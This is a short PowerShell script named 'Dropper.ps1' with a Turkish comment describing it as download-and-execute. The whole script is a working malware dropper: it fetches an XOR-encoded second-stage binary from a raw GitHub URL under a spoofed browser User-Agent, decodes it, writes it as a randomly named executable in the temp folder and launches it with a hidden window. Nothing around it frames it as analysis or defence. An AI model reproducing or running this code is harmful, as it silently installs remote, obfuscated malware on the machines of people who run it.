# Dropper.ps1 - PowerShell ile indirme ve çalıştırma
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$bytes = $wc.DownloadData("https://raw.githubusercontent.com/jawaws/jawwwaw/main/stage2.bin")
$key = 0x4B
for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }
$temp = [System.IO.Path]::GetTempPath() + [System.IO.Path]::GetRandomFileName() + ".exe"
[System.IO.File]::WriteAllBytes($temp, $bytes)
Start-Process -FilePath $temp -WindowStyle Hidden